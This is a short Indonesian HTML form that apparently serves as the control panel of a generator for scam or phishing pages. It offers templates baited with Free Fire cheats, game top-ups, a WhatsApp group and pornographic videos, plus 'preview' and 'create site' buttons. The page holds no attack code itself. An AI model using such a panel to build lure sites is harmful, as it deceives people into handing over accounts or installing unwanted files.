<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>WEB FABZ3306</title>
</head>
<body>
<div class="panel">
    <form action="proses.php" method="post">
        <label for="nomor"><br>𝗡𝗼𝗺𝗼𝗿 𝗪𝗲𝗯 𝟭-𝟭𝟬:
        </br>
        <br>
        1. MediaFire Cheat FF
        </br>
        <br>
        2. MediaFire APK FF
        </br>
        <br>
        3. Grup WhatsApp
        </br>
        <br>
        4. BokepMama Hot
        </br>
        <br>
        5. Video Hot Terbaru
        </br>
        <br>
        6. MediaFire Bokep
        </br>
        <br>
        7. Codashop FF
        </br>
        </label>
        <input type="number" id="nomor" name="nomor" min="1" max="10" required>
        <div class="button-group">
            <button type="submit" name="cekweb">𝗖𝗲𝗸 𝗧𝗮𝗺𝗽𝗶𝗹𝗮𝗻</button>
            </div>
            <div class="button-group2">
            <button type="submit" name="buatweb">𝗕𝘂𝗮𝘁 𝗪𝗲𝗯</button>
        </div>
    </form>
</div>

</body>
</html>
